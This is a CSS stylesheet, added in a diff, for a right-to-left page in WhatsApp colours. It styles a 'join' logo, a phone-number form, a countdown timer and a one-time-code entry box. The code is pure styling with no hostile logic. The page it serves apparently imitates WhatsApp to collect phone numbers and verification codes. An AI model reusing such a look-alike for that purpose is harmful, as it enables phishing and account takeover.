@@ -1,0 +1,615 @@
+/* Reset & base */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+  color: #222;
+  direction: rtl;
+  text-align: right;
+  line-height: 1.5;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+/* Navbar */
+.navbar {
+  background: linear-gradient(to left, #075E54, #128C7E);
+  color: #fff;
+  padding: 15px 25px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  box-shadow: 0 3px 15px rgba(7, 94, 84, 0.2);
+  user-select: none;
+  font-weight: 700;
+  font-size: 1.3rem;
+  letter-spacing: 0.02em;
+  position: relative;
+  z-index: 100;
+}
+
+.navbar img {
+  height: 45px;
+  width: auto;
+
+}
+
+.navbar-title {
+  font-size: 1.3rem;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+
+/* Container */
+.container {
+  background: #fff;
+  max-width: 500px;
+  margin: 40px auto;
+  padding: 0 20px;
+  animation: fadeIn 0.5s ease;
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Logo */
+.join-logo {
+  width: 140px;
+  margin: 0 auto 30px;
+  display: block;
+  border-radius: 15px;
+  padding: 15px;
+  background: rgba(37, 211, 102, 0.05);
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+}
+
+/* Heading */
+h2 {
+  font-size: 1.8rem;
+  color: #075E54;
+  font-weight: 800;
+  letter-spacing: 0.03em;
+  margin-bottom: 30px;
+  user-select: none;
+  text-align: center;
+  line-height: 1.4;
+}
+
+/* Form */
+form {
+  display: flex;
+  flex-direction: column;
+  gap: 26px;
+}
+
+/* Phone input group */
+.phone-group {
+  display: flex;
+  gap: 14px;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Select & input */
+select,
+input[type="tel"] {
+  padding: 18px 20px;
+  border-radius: 12px;
+  border: 2px solid #e0e0e0;
+  font-size: 1.1rem;
+  font-family: 'Cairo', sans-serif;
+  background-color: #f8f9fa;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  min-width: 0;
+  box-shadow: none;
+  outline: none;
+  color: #075E54;
+  user-select: text;
+  box-sizing: border-box;
+}
+
+/* Select styling */
+select {
+  flex: 0 0 160px;
+  cursor: pointer;
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23075E54' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: left 15px center;
+  background-size: 12px;
+  padding-left: 35px;
+}
+
+/* Input full width */
+input[type="tel"] {
+  flex-grow: 1;
+  text-align: right;
+  direction: ltr;
+}
+
+/* Focus states */
+select:focus,
+input[type="tel"]:focus {
+  border-color: #25D366;
+  box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.15);
+  background-color: #fff;
+}
+
+/* Button */
+button {
+  background: linear-gradient(to left, #25D366, #128C7E);
+  color: white;
+  font-size: 1.15rem;
+  font-weight: 700;
+  padding: 18px 30px;
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  letter-spacing: 0.5px;
+  position: relative;
+  overflow: hidden;
+  width: 100%;
+  user-select: none;
+  user-drag: none;
+  font-family: 'Cairo', sans-serif;
+}
+
+button::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transition: 0.5s;
+}
+
+button:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+}
+
+button:hover::before {
+  left: 100%;
+}
+
+button:active {
+  transform: translateY(-1px);
+  box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+}
+
+button:disabled {
+  background: #cccccc;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
+button:disabled:hover::before {
+  display: none;
+}
+
+/* Message d'erreur */
+#errorMsg {
+  display: none;
+  color: #d32f2f;
+  background-color: #ffebee;
+  border: 1px solid #ffcdd2;
+  padding: 15px;
+  border-radius: 10px;
+  margin-bottom: 25px;
+  text-align: center;
+  font-weight: 600;
+  font-size: 1rem;
+  animation: slideIn 0.3s ease;
+  box-shadow: 0 3px 10px rgba(211, 47, 47, 0.1);
+}
+
+@keyframes slideIn {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Footer style professionnel style WhatsApp */
+.footer {
+  margin-top: auto;
+  background: rgba(255, 255, 255, 0.9);
+  color: #666;
+  font-size: 0.9rem;
+  padding: 25px 20px;
+  text-align: center;
+  direction: rtl;
+  user-select: none;
+  letter-spacing: 0.02em;
+  font-weight: 600;
+  border-top: 1px solid rgba(0, 0, 0, 0.05);
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.footer p {
+  margin: 8px 0;
+  opacity: 0.8;
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+  .container {
+    margin: 30px auto;
+    padding: 0 15px;
+  }
+
+  .phone-group {
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  select {
+    width: 100%;
+    flex: 1;
+  }
+
+  input[type="tel"] {
+    width: 100%;
+  }
+
+  .join-logo {
+    width: 120px;
+  }
+
+  h2 {
+    font-size: 1.6rem;
+  }
+
+  button {
+    padding: 16px;
+    font-size: 1.1rem;
+  }
+}
+
+@media (max-width: 480px) {
+  .navbar {
+    padding: 10px 15px;
+  }
+
+  .navbar-title {
+    font-size: 1.1rem;
+  }
+
+  .navbar img {
+    height: 35px;
+  }
+
+  .container {
+    margin: 20px auto;
+  }
+
+  .join-logo {
+    width: 100px;
+  }
+
+  h2 {
+    font-size: 1.4rem;
+  }
+
+  select,
+  input[type="tel"] {
+    padding: 16px;
+  }
+
+  .footer {
+    padding: 20px 15px;
+    font-size: 0.85rem;
+  }
+}
+
+/* Loading Popup Overlay */
+.loading-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.85);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  animation: overlayIn 0.3s ease;
+}
+
+@keyframes overlayIn {
+  from {
+    opacity: 0;
+  }
+
+  to {
+    opacity: 1;
+  }
+}
+
+/* Popup blanc avec spinner et texte */
+.loading-popup {
+  background: #fff;
+  padding: 40px 35px;
+  border-radius: 20px;
+  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 25px;
+  min-width: 280px;
+  max-width: 90%;
+  animation: popupIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+@keyframes popupIn {
+  from {
+    opacity: 0;
+    transform: scale(0.8) translateY(20px);
+  }
+
+  to {
+    opacity: 1;
+    transform: scale(1) translateY(0);
+  }
+}
+
+/* Spinner cercle tournant vert WhatsApp */
+.loading-spinner {
+  border: 5px solid #f3f3f3;
+  border-top: 5px solid #25D366;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+}
+
+/* Animation rotation du spinner */
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
+  }
+
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+/* الكرونو الدائري */
+.chrono-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 20px;
+}
+
+.chrono-circle {
+  width: 180px;
+  height: 180px;
+  border-radius: 50%;
+  background: conic-gradient(#25D366 0deg, #f0f0f0 0deg);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: relative;
+  box-shadow: 0 10px 30px rgba(37, 211, 102, 0.3);
+  transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.chrono-circle::before {
+  content: '';
+  position: absolute;
+  width: 160px;
+  height: 160px;
+  background: white;
+  border-radius: 50%;
+  box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.08);
+}
+
+.chrono-timer {
+  position: relative;
+  z-index: 1;
+  font-size: 3.2rem;
+  font-weight: 900;
+  color: #075E54;
+  font-family: 'Cairo', sans-serif;
+  transition: all 0.3s;
+  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.chrono-label {
+  font-size: 1.3rem;
+  color: #075E54;
+  font-weight: 800;
+  margin-top: 5px;
+  background: linear-gradient(to left, #25D366, #128C7E);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+  letter-spacing: 0.5px;
+}
+
+/* OTP Container */
+.otp-container {
+  background: #fff;
+  max-width: 500px;
+  margin: 40px auto;
+  padding: 40px 30px;
+  border-radius: 16px;
+  box-shadow: 0 14px 36px rgba(0, 0, 0, 0.08);
+  text-align: center;
+  direction: rtl;
+}
+
+.otp-logo {
+  width: 140px;
+  margin: 0 auto 25px;
+  display: block;
+  border-radius: 15px;
+  padding: 15px;
+  background: rgba(37, 211, 102, 0.05);
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+}
+
+.otp-title {
+  font-size: 1.8rem;
+  color: #075E54;
+  margin-bottom: 20px;
+  font-weight: 800;
+}
+
+.otp-subtitle {
+  color: #666;
+  font-size: 1.05rem;
+  margin-bottom: 35px;
+  line-height: 1.7;
+}
+
+#otpInput {
+  font-size: 1.8rem;
+  letter-spacing: 15px;
+  padding: 18px 20px;
+  border: 2px solid #e0e0e0;
+  border-radius: 12px;
+  text-align: center;
+  width: 100%;
+  box-sizing: border-box;
+  margin-bottom: 25px;
+  background-color: #f8f9fa;
+  font-family: 'Courier New', monospace;
+  color: #075E54;
+  font-weight: 700;
+  direction: ltr;
+}
+
+#otpInput:focus {
+  border-color: #25D366;
+  box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.15);
+  background: white;
+}
+
+#confirmOtpBtn {
+  background: linear-gradient(to left, #25D366, #128C7E);
+  color: white;
+  padding: 18px 30px;
+  border: none;
+  border-radius: 12px;
+  width: 100%;
+  font-size: 1.15rem;
+  cursor: pointer;
+  font-weight: 700;
+}
+
+#confirmOtpBtn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+}
+
+/* Dark Mode Support */
+@media (prefers-color-scheme: dark) {
+  body {
+    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+    color: #e0e0e0;
+  }
+
+  .container,
+  .otp-container {
+    background: #2d2d2d;
+  }
+
+  h2,
+  .otp-title {
+    color: #25D366;
+  }
+
+  .otp-subtitle {
+    color: #aaa;
+  }
+
+  #otpInput {
+    background: #3d3d3d;
+    border-color: #555;
+    color: #25D366;
+  }
+
+  select,
+  input[type="tel"] {
+    background: #3d3d3d;
+    border-color: #555;
+    color: #e0e0e0;
+  }
+
+  .footer {
+    background: rgba(45, 45, 45, 0.9);
+    color: #aaa;
+  }
+
+  #errorMsg {
+    background-color: #5c2b29;
+    border-color: #8a3c38;
+    color: #ffb4ab;
+  }
+
+  .loading-popup {
+    background: #2d2d2d;
+    color: #e0e0e0;
+  }
+
+  .loading-spinner {
+    border-top-color: #25D366;
+  }
+
+  .chrono-circle::before {
+    background: #2d2d2d;
+  }
+
+  .chrono-timer {
+    color: #25D366;
+  }
+}
+
+/* تحسينات اللمس */
+@media (hover: none) and (pointer: coarse) {
+  button:hover {
+    transform: none;
+  }
+
+  button:active {
+    transform: scale(0.98);
+  }
+
+  select,
+  input[type="tel"] {
+    font-size: 1.2rem;
+    padding: 20px;
+  }
+}
